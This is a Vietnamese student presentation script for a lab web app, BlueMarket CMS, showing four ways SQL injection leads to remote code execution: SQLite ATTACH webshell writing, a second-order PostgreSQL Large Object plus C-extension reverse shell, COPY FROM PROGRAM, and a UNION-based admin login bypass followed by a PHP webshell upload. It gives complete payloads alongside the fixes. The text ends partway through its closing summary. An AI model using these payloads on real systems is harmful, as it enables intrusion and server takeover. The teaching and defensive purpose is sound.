## Mở đầu chung

Chào thầy và các bạn, phần demo của nhóm em tập trung vào website **BlueMarket CMS**. Đây là một lab mô phỏng website thương mại/nội dung nội bộ, có các chức năng như tìm kiếm sản phẩm, profile người bán, báo cáo hệ thống admin và upload media.

Điểm quan trọng là các lỗi SQL Injection không được đặt ở những trang demo riêng lẻ, mà được giấu trong các chức năng nghiệp vụ thật. Từ một lỗi SQL Injection ban đầu, tùy vị trí và quyền của database user, lỗi có thể bị nâng tác động thành **Remote Code Execution**, tức là thực thi lệnh trên server.

Nhóm em chia demo thành 4 hướng:

1. **Hướng 1:** SQLi trong tìm kiếm sản phẩm, dùng SQLite `ATTACH DATABASE` để ghi webshell.
2. **Hướng 2:** Second-order SQLi trong profile seller, dùng PostgreSQL Large Object và C extension để tạo reverse shell.
3. **Hướng 3:** SQLi trong admin report, dùng PostgreSQL `COPY FROM PROGRAM` để chạy lệnh hệ điều hành.
4. **Hướng 4:** SQLi ở login để chiếm quyền admin, sau đó upload webshell để RCE.

---

## Hướng 1: SQLite ATTACH DATABASE RCE

### 1. Dẫn vào demo

Ở hướng đầu tiên, nhóm em demo lỗi nằm trong chức năng **tìm kiếm sản phẩm**.

Người dùng truy cập:

```text
/search?q=dock
```

Về mặt giao diện, đây chỉ là ô search bình thường. Nhưng phía sau, mỗi lần người dùng tìm kiếm, ứng dụng sẽ ghi lại từ khóa vào SQLite cache để hiển thị phần “Recent searches”.

### 2. Phân tích source code

Trong `SearchController::search()`, ứng dụng lấy tham số `q` từ URL:

```php
$q = trim((string) ($_GET['q'] ?? ''));
$cache = new SqliteCacheService();

if ($q !== '') {
    $cache->logSearch($q);
}
```

Như vậy, dữ liệu người dùng nhập trong `q` được truyền vào hàm `logSearch()`.

Điểm lỗi nằm trong `SqliteCacheService.php`:

```php
$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
$this->pdo->exec($sql);
```

Ở đây, biến `$keyword` được nối trực tiếp vào câu SQL. Database không còn phân biệt được đâu là dữ liệu bình thường và đâu là cú pháp SQL. Ngoài ra, hàm `exec()` có thể xử lý nhiều câu lệnh, nên nếu payload có dấu `;`, attacker có thể chèn thêm stacked query.

Với input bình thường là:

```text
dock
```

Câu SQL sẽ thành:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('dock', datetime('now'))
```

Nhưng nếu input chứa dấu nháy hoặc câu SQL mới, truy vấn sẽ bị thay đổi.

### 3. Demo exploit

Đầu tiên, em thử một payload đơn giản là dấu nháy đơn:

```text
'
```

Khi gửi:

```text
/search?q='
```

Câu SQL bị vỡ vì dấu nháy của người dùng làm hỏng chuỗi SQL. Nếu ứng dụng trả lỗi SQLite, ta xác nhận được tham số `q` đã đi vào SQL parser.

Tiếp theo, em kiểm tra stacked query bằng payload an toàn:

```sql
x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
```

Payload này có ý nghĩa như sau:

```text
x', datetime('now'));    đóng câu INSERT gốc
INSERT INTO ...          chèn thêm một dòng marker
--                       comment phần SQL còn dư
```

Nếu sau đó trong “Recent searches” xuất hiện dòng:

```text
sqli_stacked_ok
```

thì chứng minh được stacked query đã chạy thành công.

Sau khi xác nhận SQLi, em chuyển sang payload chính. Ý tưởng là dùng SQLite `ATTACH DATABASE` để tạo một file PHP trong thư mục upload:

```sql
x', datetime('now')); ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell; CREATE TABLE IF NOT EXISTS shell.payload (code TEXT); DELETE FROM shell.payload; INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>'); --
```

Trong source, ứng dụng có một chức năng quản lý media cho admin. Trong UploadService, thư mục lưu file được lấy từ cấu hình:$this->dir = (string) \app_config('paths.uploads');Còn trong config.php, paths.uploads được cấu hình là:'uploads' => dirname(\_\_DIR\_\_) . '/public/uploads',Nghĩa là thư mục upload thực tế nằm trong: app/public/uploads. Khi chạy trong container web, thư mục app được mount vào:/var/www/html nên đường dẫn tuyệt đối của uploads trong container sẽ là: /var/www/html/public/uploads/

Payload này gồm 5 bước:

```text
1. Đóng câu INSERT gốc.
2. ATTACH DATABASE để tạo file cache.php trong public/uploads.
3. Tạo bảng payload trong file vừa attach.
4. Xóa dữ liệu cũ nếu file đã tồn tại.
5. Ghi đoạn PHP webshell vào file.
```

Sau khi gửi payload, em truy cập:

```text
/uploads/cache.php?cmd=id
```

Nếu kết quả trả về dạng:

```text
uid=33(www-data) gid=33(www-data)
```

thì chứng minh được server đã thực thi lệnh hệ điều hành thông qua file PHP vừa tạo. Lúc này SQL Injection đã dẫn tới RCE.

### 4. Kết luận hướng 1

Root cause của hướng này là:

```text
User input q
→ được nối trực tiếp vào SQL
→ PDO::exec() cho phép stacked query
→ SQLite ATTACH DATABASE tạo được file
→ file nằm trong webroot
→ PHP-FPM thực thi file .php
→ RCE
```

### 5. Khắc phục

Cách sửa chính là thay nối chuỗi bằng prepared statement:

```php
$stmt = $this->pdo->prepare(
    'INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))'
);
$stmt->execute(['keyword' => $keyword]);
```

Khi dùng prepared statement, toàn bộ payload chỉ còn là dữ liệu của keyword. Dấu `;`, `ATTACH DATABASE` hay PHP code không còn được SQLite hiểu là câu lệnh SQL nữa.

Ngoài ra, cần phòng thủ thêm:

```text
- Không đặt SQLite cache trong webroot.
- Không cho web process ghi vào thư mục có thể thực thi PHP.
- Tắt thực thi PHP trong thư mục uploads.
- Tách vùng lưu dữ liệu và vùng chạy code.
```

Câu chốt cho hướng 1 là: **SQLi không tự thành RCE ngay, nó thành RCE vì ứng dụng cho phép SQLi chạm tới primitive ghi file, và file đó lại được web server thực thi.**

---

## Hướng 2: PostgreSQL Large Object + Extension RCE

### 1. Dẫn vào demo

Hướng 2 nằm trong chức năng **seller profile**. Đây là hướng kỹ thuật sâu nhất vì payload không chạy ngay lúc nhập dữ liệu, mà được lưu vào database trước, sau đó mới được kích hoạt khi ứng dụng đọc lại dữ liệu.

Vì vậy hướng này gọi là **second-order SQL Injection**.

Tài khoản demo:

```text
Username: lan_store
Password: seller123
```

Route liên quan:

```text
/profile/update
/profile?id=3
```

### 2. Phân tích source code

Trong bước cập nhật profile, email được lưu bằng parameterized query:

```php
$db->executeParams(
    'UPDATE users SET email = $1, description = $2 WHERE id = $3',
    [$email, $description, $currentUser['id']]
);
```

Ở bước này payload chưa chạy, vì email chỉ được lưu như dữ liệu bình thường.

Nhưng khi mở lại trang profile, ứng dụng đọc email từ database rồi ghép vào câu SQL khác:

```php
$sql = "SELECT title, body, created_at
        FROM posts
        WHERE author_email = '" . $user['email'] . "'
        ORDER BY created_at DESC";

$activity = $activityDb->queryAll($sql);
```

Đây mới là điểm lỗi.

Luồng tấn công là:

```text
POST /profile/update
→ lưu payload vào trường email
→ GET /profile?id=3
→ ứng dụng đọc lại email
→ ghép email vào SQL mới
→ payload được kích hoạt
```

Điểm nguy hiểm hơn là phần activity report dùng connection:

```php
$activityDb = new PostgresService('extension');
```

Role `extension_user` trong lab có quyền cao, nên khi SQLi chạy ở đây, nó không chỉ đọc dữ liệu mà còn có thể dùng các primitive nguy hiểm của PostgreSQL.

### 3. Demo kiểm tra second-order SQLi

Đầu tiên, em đăng nhập seller và cập nhật email thành payload kiểm tra:

```sql
x'; SELECT pg_sleep(5); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Payload này chưa RCE. Nó chỉ dùng `pg_sleep(5)` để kiểm tra xem payload có được thực thi hay không.

Sau khi lưu email, em mở lại:

```text
/profile?id=3
```

Nếu response chậm khoảng 5 giây, ta chứng minh được payload đã được kích hoạt ở lần đọc profile.

Ở đây cần nhấn mạnh: **payload không chạy khi update email, mà chạy khi profile dùng lại email trong câu SQL mới.**

### 4. Demo nâng lên RCE bằng Large Object + C extension

Sau khi xác nhận được second-order SQLi, nhóm em chuyển sang bước nâng tác động từ SQL Injection thành RCE. Ở hướng này, RCE không đến từ `COPY FROM PROGRAM` như hướng 3, mà đến từ cơ chế **PostgreSQL C extension**.

Trước hết cần giải thích file `.so` là gì. File `.so` là **shared object** trên Linux, có thể hiểu giống file `.dll` trên Windows. Đây là một thư viện động đã được biên dịch từ C/C++. PostgreSQL có cơ chế cho phép tạo một function bằng ngôn ngữ C, sau đó trỏ function đó tới file `.so`. Khi gọi function trong SQL, PostgreSQL sẽ chạy code C nằm trong file `.so`.

Trong lab này, file source C là:

```text
postgres/extensions/pg_rev_shell.c
```

Sau khi biên dịch, nó tạo ra file:

```text
pg_rev_shell.so
```

File này không phải webshell PHP và cũng không phải câu lệnh SQL. Nó là mã native đã biên dịch. Bên trong file `.so` có hàm `rev_shell`, hàm này nhận địa chỉ IP và port của máy listener, sau đó tạo kết nối ngược về máy đó để mở reverse shell.

Có thể hiểu đơn giản:

```text
pg_rev_shell.c     → mã nguồn C
pg_rev_shell.so    → file thư viện đã biên dịch
rev_shell()        → hàm C nằm bên trong file .so
SELECT rev_shell() → PostgreSQL gọi hàm C đó từ SQL
```

Ý tưởng tổng quát của hướng 2 là:

```text
Second-order SQLi
→ tạo Large Object trong PostgreSQL
→ ghi từng mảnh của file pg_rev_shell.so vào pg_largeobject
→ dùng lo_export() để xuất Large Object ra thành file .so thật trong /tmp
→ CREATE FUNCTION trỏ tới file .so
→ gọi function rev_shell()
→ nhận reverse shell dưới quyền postgres
```

Điểm cần nhấn mạnh là attacker **không upload file `.so` qua form upload**. Điểm vào duy nhất ở hướng này là lỗi SQL Injection trong profile. Vì vậy nhóm em dùng cơ chế **Large Object** của PostgreSQL để đưa file nhị phân vào database.

Large Object có thể hiểu là vùng lưu trữ file nhị phân lớn bên trong PostgreSQL. Vì file `.so` là file nhị phân, không thể nhét nguyên một lần vào payload SQL, nên nó được chia thành nhiều mảnh nhỏ, mỗi mảnh 2048 byte. Mỗi mảnh được đổi sang dạng hex rồi ghi vào bảng hệ thống `pg_largeobject`.

Nói cách khác:

```text
pg_rev_shell.so
→ chia thành nhiều page 2048 byte
→ page-000.hex, page-001.hex, page-002.hex, ...
→ từng page được INSERT vào pg_largeobject
→ PostgreSQL ghép lại thành một Large Object hoàn chỉnh
```

Trước tiên, em kiểm tra role đang chạy:

```sql
x'; SELECT current_user AS title, current_database() AS body, now() AS created_at WHERE '1'='1
```

Kết quả là:

```text
extension_user
```

Đây là điểm rất quan trọng. Nếu query chỉ chạy bằng một user ít quyền thì chưa chắc khai thác được. Nhưng trong lab, đoạn activity report lại dùng connection `extension`, tức là query chạy dưới role `extension_user`. Role này có quyền cao, nên có thể dùng các primitive nguy hiểm như Large Object, export file và tạo C function.

Sau đó, em tạo một Large Object ID cố định là `55001`:

```sql
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT lo_create(55001); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Giải thích payload này:

```text
DROP FUNCTION IF EXISTS rev_shell(text, integer)
→ xóa function cũ nếu đã từng tạo trước đó

SELECT CASE WHEN EXISTS (...)
→ kiểm tra Large Object ID 55001 đã tồn tại chưa

lo_unlink(55001)
→ nếu đã tồn tại thì xóa để tránh lỗi khi tạo lại

lo_create(55001)
→ tạo Large Object rỗng có ID là 55001
```

Sau khi có Large Object rỗng, file `pg_rev_shell.so` được ghi dần vào `pg_largeobject`. Mỗi page được ghi bằng payload dạng:

```sql
x'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (55001, <PAGE_NO>, decode('<HEX_PAGE>', 'hex')); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Trong đó:

```text
loid = 55001
→ cho PostgreSQL biết page này thuộc Large Object nào

pageno = <PAGE_NO>
→ số thứ tự của mảnh file, ví dụ 0, 1, 2, 3,...

data = decode('<HEX_PAGE>', 'hex')
→ chuyển dữ liệu hex về dạng nhị phân thật rồi lưu vào Large Object
```

Nếu làm thủ công thì phải gửi rất nhiều payload, mỗi payload tương ứng với một page. Vì vậy lab có script helper:

```powershell
python .\postgres\upload-lo-pages.py
```

Script này đọc các file `page-*.hex`, tự tạo payload `INSERT INTO pg_largeobject`, rồi gửi lần lượt để dựng lại file `.so` bên trong database.

Sau khi ghi đủ page, lúc này file `.so` vẫn chưa nằm trên filesystem. Nó mới chỉ nằm trong database dưới dạng Large Object. Để PostgreSQL load được C extension, cần xuất Large Object ra thành file thật bằng `lo_export()`:

```sql
SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so');
```

Câu này có nghĩa là:

```text
Lấy Large Object ID 55001
→ ghi nội dung của nó ra filesystem
→ tạo file thật tại /tmp/pg_rev_shell_manual.so
```

Sau đó payload tạo function C:

```sql
CREATE FUNCTION rev_shell(text, integer)
RETURNS integer
AS '/tmp/pg_rev_shell_manual', 'rev_shell'
LANGUAGE C STRICT;
```

Giải thích câu này:

```text
CREATE FUNCTION rev_shell(text, integer)
→ tạo một hàm SQL tên rev_shell, nhận 2 tham số: IP và port

RETURNS integer
→ hàm trả về kiểu integer

AS '/tmp/pg_rev_shell_manual', 'rev_shell'
→ code thật của hàm nằm trong file /tmp/pg_rev_shell_manual.so
→ symbol C cần gọi trong file đó tên là rev_shell

LANGUAGE C
→ đây không phải hàm SQL bình thường, mà là hàm viết bằng C
```

Sau khi function đã được tạo, em mở listener trên máy host:

```powershell
python .\postgres\rev-shell-listener.py
```

Cuối cùng, gọi function:

```sql
SELECT rev_shell('<LHOST>', 4444);
```

Trong đó `<LHOST>` là IP của máy đang mở listener, còn `4444` là port đang lắng nghe. Khi câu lệnh này chạy, PostgreSQL sẽ nạp file `.so`, gọi hàm C `rev_shell`, rồi hàm này tạo kết nối ngược về listener.

Payload cuối có dạng:

```sql
x'; SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so'); SELECT lo_unlink(55001); CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell_manual', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('<LHOST>', 4444); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Khi payload chạy thành công, listener nhận được shell. Em thử các lệnh an toàn:

```text
id
whoami
pwd
hostname
```

Nếu kết quả là user `postgres`, nghĩa là SQL Injection đã dẫn tới thực thi code trong container database.

Có thể tóm tắt phần file `.so` như sau:

```text
File .so chính là cầu nối từ SQL sang mã native.
SQLi giúp đưa file .so vào PostgreSQL bằng Large Object.
lo_export biến Large Object thành file thật trên disk.
CREATE FUNCTION LANGUAGE C khiến PostgreSQL load file .so.
SELECT rev_shell() làm code C bên trong .so chạy.
Kết quả là reverse shell dưới quyền postgres.
```

Câu thuyết trình ngắn gọn cho đoạn này là:

“Ở đây, nhóm em không upload file `.so` qua giao diện web. Nhóm em lợi dụng SQL Injection để ghi từng mảnh của file `.so` vào Large Object của PostgreSQL. Sau đó dùng `lo_export()` để xuất nó ra `/tmp`, dùng `CREATE FUNCTION LANGUAGE C` để PostgreSQL load file đó như một extension, rồi gọi `rev_shell()` để nhận reverse shell. Vì vậy file `.so` chính là cầu nối biến SQL Injection thành thực thi mã native trên server database.”


### 5. Kết luận hướng 2

Root cause của hướng này là:

```text
Seller kiểm soát email profile
→ email được lưu vào database
→ profile đọc lại email
→ email bị ghép trực tiếp vào SQL activity report
→ query chạy bằng role extension_user có quyền cao
→ PostgreSQL Large Object + CREATE FUNCTION C
→ reverse shell
```

Điểm khác của hướng 2 là đây là **second-order SQLi**: dữ liệu độc hại được lưu trước, sau đó mới phát nổ khi được dùng lại.

### 6. Khắc phục

Code sửa ở phần activity report:

```php
$activity = $activityDb->params(
    'SELECT title, body, created_at
     FROM posts
     WHERE author_email = $1
     ORDER BY created_at DESC',
    [$user['email']]
);
```

Khi dùng `$1`, email chỉ là dữ liệu, không thể biến thành cú pháp SQL.

Ngoài ra cần sửa về phân quyền:

```text
- Không dùng extension_user cho chức năng profile.
- App chỉ nên dùng app_user ít quyền.
- Không cấp quyền tạo C function cho role ứng dụng.
- Không cho role ứng dụng lo_export file tùy ý.
- Không dùng database superuser trong web app.
```

Câu chốt cho hướng 2 là: **dữ liệu đã lưu trong database vẫn phải được coi là dữ liệu không tin cậy. Lưu an toàn không có nghĩa là dùng lại an toàn.**

---

## Hướng 3: PostgreSQL COPY FROM PROGRAM RCE

### 1. Dẫn vào demo

Hướng 3 nằm trong khu vực **Admin System Reports**.

Route:

```text
/admin/reports?type=health
```

Chức năng này cho phép admin lọc report theo tham số `type`.

### 2. Phân tích source code

Trong `ReportController::system()`, ứng dụng lấy `type` từ URL:

```php
$type = (string) ($_GET['type'] ?? 'health');
$db = new PostgresService('report');
```

Sau đó ghép trực tiếp vào SQL:

```php
$sql = "SELECT type, label, description, query_name
        FROM report_templates
        WHERE type = '" . $type . "'
        ORDER BY id";

$templates = $db->queryAll($sql);
```

Với request bình thường:

```text
/admin/reports?type=health
```

SQL sẽ là:

```sql
SELECT type, label, description, query_name
FROM report_templates
WHERE type = 'health'
ORDER BY id
```

Nhưng vì `type` được nối chuỗi, attacker có thể đóng dấu nháy và thêm statement mới.

Điểm nguy hiểm là connection này dùng role:

```text
report_user
```

Trong lab, role này được cấp quyền:

```sql
GRANT pg_execute_server_program TO report_user;
```

Quyền này cho phép PostgreSQL dùng `COPY FROM PROGRAM` để chạy command hệ điều hành.

### 3. Demo exploit

Đầu tiên, em đăng nhập admin:

```text
Username: admin
Password: admin123
```

Sau đó mở report bình thường:

```text
/admin/reports?type=health
```

Tiếp theo thử dấu nháy:

```text
/admin/reports?type='
```

Nếu có lỗi PostgreSQL, chứng minh được `type` được đưa trực tiếp vào SQL.

Sau đó, em kiểm tra stacked query bằng marker an toàn:

```sql
health'; INSERT INTO report_worker_output(line) VALUES ('stacked query works'); SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Payload này có 3 phần:

```text
health'     đóng chuỗi type
INSERT ...  ghi marker vào bảng report_worker_output
SELECT ...  giữ phần ORDER BY còn lại hợp lệ
```

Ở đây cần giải thích rõ vì sao nhóm em lại dùng:

```sql
INSERT INTO report_worker_output(line)
VALUES ('stacked query works');
```

Bảng `report_worker_output` đóng vai trò như một **kênh hiển thị kết quả ra giao diện Reports**. Khi trang `/admin/reports` được mở, ứng dụng không chỉ đọc danh sách report template, mà còn đọc nội dung trong bảng `report_worker_output` để hiển thị ở phần **Worker Output**. Vì vậy nếu payload `INSERT` ghi được dòng `stacked query works` vào cột `line`, sau đó dòng này xuất hiện trên giao diện, nhóm em chứng minh được hai điều:

```text
1. Payload đã thoát khỏi chuỗi WHERE type = '...'.
2. Stacked query phía sau dấu ; đã được PostgreSQL thực thi thật.
```

Nói cách khác, `INSERT INTO report_worker_output(line)` chưa phải là RCE. Đây là bước kiểm tra an toàn để xác nhận SQLi có thể chạy thêm câu lệnh SQL phụ và có một kênh quan sát kết quả trên giao diện. Khi bước marker này thành công, nhóm em mới thay `INSERT` bằng primitive nguy hiểm hơn là `COPY FROM PROGRAM`.

Lý do không insert vào bảng bất kỳ là vì nếu ghi vào bảng khác, giao diện có thể không đọc và mình sẽ khó chứng minh payload đã chạy. Còn `report_worker_output` là bảng được thiết kế để trang Reports đọc ra, nên rất phù hợp để làm nơi chứa marker và chứa output của lệnh hệ điều hành ở bước sau.

Sau khi gửi payload, mở lại:

```text
/admin/reports?type=health
```

Nếu phần Worker Output hiện:

```text
stacked query works
```

thì chứng minh được stacked query chạy thành công và output channel hoạt động.

Bây giờ em thay câu `INSERT` bằng `COPY FROM PROGRAM`:

```sql
health'; COPY report_worker_output(line) FROM PROGRAM 'id'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Ở đây cần giải thích rõ `COPY FROM PROGRAM` là gì. Trong PostgreSQL, `COPY ... FROM` bình thường được dùng để nạp dữ liệu từ file hoặc từ luồng dữ liệu vào một bảng. Nhưng biến thể `COPY ... FROM PROGRAM` nguy hiểm hơn: thay vì đọc dữ liệu từ file, PostgreSQL sẽ **chạy một chương trình/lệnh hệ điều hành**, rồi lấy output của lệnh đó ghi vào bảng.

Cấu trúc tổng quát là:

```sql
COPY ten_bang(cot_can_ghi)
FROM PROGRAM 'lenh_he_dieu_hanh';
```

Trong payload của nhóm em:

```sql
COPY report_worker_output(line) FROM PROGRAM 'id';
```

ý nghĩa là:

```text
1. PostgreSQL chạy lệnh hệ điều hành: id
2. Lệnh id in ra thông tin user đang chạy process PostgreSQL
3. PostgreSQL lấy output đó
4. Ghi từng dòng output vào cột line của bảng report_worker_output
5. Trang Reports đọc bảng này và hiển thị lại ở phần Worker Output
```

Vì vậy `COPY FROM PROGRAM` chính là primitive chuyển từ SQL sang command hệ điều hành. Nếu câu `INSERT INTO report_worker_output(line)` ở bước trước chỉ dùng để kiểm tra stacked query, thì `COPY FROM PROGRAM` là bước chứng minh RCE thật sự, vì database server đã chạy lệnh `id` ở tầng hệ điều hành.

Điểm quan trọng là không phải role PostgreSQL nào cũng chạy được `COPY FROM PROGRAM`. Trong lab, payload chạy bằng role `report_user`, và role này đã được cấp quyền:

```sql
GRANT pg_execute_server_program TO report_user;
```

Nếu không có quyền này, PostgreSQL sẽ chặn `COPY FROM PROGRAM`. Do đó root cause ở đây gồm hai phần: câu SQL bị nối chuỗi gây SQLi, và database role có quyền quá nguy hiểm.

Câu này yêu cầu PostgreSQL chạy lệnh:

```text
id
```

Output của lệnh được ghi vào bảng `report_worker_output`, sau đó trang Reports đọc bảng này và hiển thị lại.

Kết quả mong đợi:

```text
uid=999(postgres) gid=999(postgres)
```

Có thể thử thêm các lệnh an toàn khác:

```sql
health'; COPY report_worker_output(line) FROM PROGRAM 'whoami'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

```sql
health'; COPY report_worker_output(line) FROM PROGRAM 'hostname'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Khi output hiện trên giao diện, ta chứng minh được SQL Injection đã dẫn tới OS command execution.

### 4. Kết luận hướng 3

Root cause của hướng này là:

```text
Admin kiểm soát parameter type
→ type được nối trực tiếp vào SQL
→ stacked query chạy được
→ query chạy bằng report_user
→ report_user có pg_execute_server_program
→ COPY FROM PROGRAM chạy command
→ output được ghi vào worker log và hiển thị lại
```

Hướng 3 là hướng demo gọn nhất vì không cần upload file, không cần compile extension, không cần reverse shell. Chỉ cần command `id` là đủ chứng minh RCE.

### 5. Khắc phục

Code sửa:

```php
$templates = $db->params(
    'SELECT type, label, description, query_name
     FROM report_templates
     WHERE type = $1
     ORDER BY id',
    [$type]
);
```

Khi dùng parameterized query, payload trong `type` chỉ còn là giá trị lọc report, không thể trở thành `COPY FROM PROGRAM`.

Ngoài ra phải sửa quyền:

```text
- Report không dùng report_user quyền cao.
- Không cấp pg_execute_server_program cho role của web app.
- App user chỉ có quyền SELECT/INSERT cần thiết.
- Không để user-controlled query chạm tới role có quyền chạy OS command.
```

Câu chốt cho hướng 3 là: **SQLi trở nên nghiêm trọng hơn rất nhiều khi database user có quyền quá cao. Đây là ví dụ điển hình của việc thiếu least privilege.**

---

## Hướng 4: SQLi Admin Takeover Upload RCE

### 1. Dẫn vào demo

Hướng 4 khác ba hướng trước. Ở đây RCE không đến trực tiếp từ database primitive như `COPY FROM PROGRAM` hay Large Object.

Thay vào đó, chuỗi tấn công là:

```text
SQLi ở login
→ tạo session admin giả
→ truy cập chức năng upload media
→ upload file PHP
→ truy cập webshell
→ RCE
```

Tức là SQL Injection dẫn tới chiếm quyền ứng dụng, rồi quyền admin bị lạm dụng để upload code.

### 2. Phân tích source code phần login

Trong `AuthController::login()`, ứng dụng lấy username và password từ form:

```php
$username = trim((string) ($_POST['username'] ?? ''));
$password = (string) ($_POST['password'] ?? '');
```

Sau đó truy vấn user bằng cách nối chuỗi:

```php
$user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
```

Nếu query trả về một row, ứng dụng kiểm tra password:

```php
if (!$user || !$this->passwordMatches($password, (string) $user['password_hash'])) {
    redirect('/login');
}
```

Sau đó lấy role từ row trả về để ghi vào session:

```php
$_SESSION['user'] = [
    'id' => (int) $user['id'],
    'username' => $user['username'],
    'email' => $user['email'],
    'role' => $user['role'],
];
```

Vấn đề là nếu attacker dùng `UNION SELECT` để tạo một row giả có `role = 'admin'`, ứng dụng vẫn tin row đó và tạo session admin.

### 3. Demo admin takeover

Payload username:

```sql
' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP-- -
```

Password gửi kèm:

```text
ownedpass
```

Vì bảng `users` có 7 cột, payload cũng trả về đúng 7 giá trị:

```text
id = 999
username = owned
email = owned@bluemarket.local
password_hash = ownedpass
role = admin
description = Injected admin row
created_at = CURRENT_TIMESTAMP
```

Ở đây cần giải thích kỹ hơn vì sao giá trị `ownedpass` lại giúp đăng nhập thành công.

Trong hệ thống bình thường, cột `password_hash` phải chứa chuỗi hash của mật khẩu, ví dụ hash bcrypt hoặc argon2 dạng:

```text
$2y$10$...
```

Khi người dùng đăng nhập, ứng dụng sẽ lấy password người dùng nhập vào rồi dùng `password_verify()` để so sánh với hash đang lưu trong database. Nếu làm đúng chuẩn, attacker không thể chỉ nhét chuỗi `ownedpass` vào cột `password_hash` rồi đăng nhập được.

Nhưng trong lab này, hàm `passwordMatches()` ở vulnerable mode có thêm **fallback so sánh plaintext**. Tức là nếu kiểm tra hash không khớp, hàm còn so sánh trực tiếp:

```text
password người dùng nhập == giá trị trong cột password_hash
```

Vì vậy payload `UNION SELECT` tạo ra một dòng user giả có các giá trị quan trọng là:

```text
username      = owned
password_hash = ownedpass
role          = admin
```

Sau đó request login gửi password là:

```text
ownedpass
```

Lúc này `passwordMatches()` sẽ so sánh:

```text
password nhập vào: ownedpass
password_hash giả: ownedpass
```

Hai giá trị này giống nhau, nên hàm xác thực trả về đúng. Sau đó ứng dụng lấy tiếp trường `role = admin` từ dòng giả và ghi vào session. Kết quả là attacker không cần biết mật khẩu admin thật, nhưng vẫn tạo được một phiên đăng nhập có quyền admin.

Điểm cần nhấn mạnh khi thuyết trình là: **`UNION SELECT` không tạo user thật trong database. Nó chỉ tạo một dòng kết quả giả trong response của câu SELECT. Nhưng vì ứng dụng tin dòng kết quả đó để kiểm tra mật khẩu và lấy role, nên attacker vẫn đăng nhập được như admin.**

Câu SQL sau khi ghép sẽ có dạng:

```sql
SELECT *
FROM users
WHERE username = ''
UNION SELECT
    999,
    'owned',
    'owned@bluemarket.local',
    'ownedpass',
    'admin',
    'Injected admin row',
    CURRENT_TIMESTAMP
-- -'
```

Do lab có fallback so sánh plaintext trong `passwordMatches()`, password `ownedpass` khớp với trường `password_hash` giả. Ứng dụng tạo session có role admin và redirect vào `/admin`.

Đến đây, SQLi đã giúp chiếm quyền admin.

### 4. Phân tích source code phần upload

Sau khi có session admin, request upload đi vào:

```php
AdminController::uploadMedia()
```

Code gọi:

```php
(new UploadService())->store($_FILES['media'] ?? []);
```

Trong `UploadService::store()`:

```php
$name = basename((string) $file['name']);
$target = $this->dir . '/' . $name;

move_uploaded_file((string) $file['tmp_name'], $target);
```

Ở vulnerable mode, service chỉ dùng `basename()` để lấy tên file, nhưng không kiểm tra extension, không kiểm tra MIME thật và không đổi tên file random.

Vì vậy nếu upload file:

```text
shell.php
```

thì file có thể được lưu vào:

```text
public/uploads/shell.php
```

### 5. Demo upload webshell

Tạo file `shell.php`:

```php
<?php system($_GET["cmd"] ?? "id"); ?>
```

Upload file này ở trang:

```text
/admin/media
```

Sau đó truy cập:

```text
/uploads/shell.php?cmd=id
```

Nếu kết quả trả về:

```text
uid=33(www-data) gid=33(www-data)
```

thì chứng minh được file PHP trong uploads đã được web server thực thi. Đây là RCE dưới quyền process web.

### 6. Kết luận hướng 4

Root cause của hướng này gồm hai lỗi kết hợp:

```text
Lỗi 1: SQL Injection ở login
→ username nối trực tiếp vào SQL
→ UNION SELECT tạo row admin giả
→ role admin được ghi vào session

Lỗi 2: Upload thiếu kiểm soát
→ admin upload được file .php
→ file nằm trong public/uploads
→ PHP-FPM thực thi file
→ RCE
```

Điểm cần nói rõ: **SQLi ở hướng 4 không trực tiếp chạy lệnh hệ điều hành. SQLi giúp chiếm quyền admin, còn RCE xảy ra nhờ chức năng upload nguy hiểm của ứng dụng.**

### 7. Khắc phục

Sửa phần login bằng parameterized query:

```php
$user = $db->paramsOne(
    'SELECT * FROM users WHERE username = $1',
    [$username]
);
```

Khi đó payload `UNION SELECT` chỉ là chuỗi username, không thể thay đổi cấu trúc truy vấn.

Sửa phần xác thực:

```text
- Không dùng fallback plaintext trong passwordMatches().
- Chỉ dùng password_verify() với password hash hợp lệ.
- Regenerate session ID sau khi login thành công.
- Không tin role từ row không được xác thực đúng.
```

Sửa phần upload:

```text
- Chỉ cho phép extension ảnh: jpg, jpeg, png, gif, webp.
- Kiểm tra MIME thật của file.
- Giới hạn kích thước file.
- Đổi filename sang tên random.
- Không cho upload file .php.
- Cấu hình Nginx/PHP-FPM không thực thi PHP trong thư mục uploads.
```

Câu chốt cho hướng 4 là: **một lỗi SQLi tưởng như chỉ ảnh hưởng đăng nhập có thể trở thành RCE nếu sau khi chiếm admin, hệ thống còn có chức năng upload hoặc template nguy hiểm.**

---

## Tổng kết chung

Qua 4 hướng demo, nhóm em rút ra điểm chung:

```text
SQL Injection
→ chỉ là điểm vào ban đầu

RCE
→ xảy ra khi SQLi chạm tới primitive nguy hiểm
→ hoặc database user có quyền quá cao
→ hoặc ứng dụng có chức năng upload/template thiếu kiểm soát
```

Bốn primitive trong bài gồm:

```text
Hướng 1: SQLite ATTACH DATABASE → ghi file vào webroot
Hướng 2: PostgreSQL Large Object + C extension → load native code
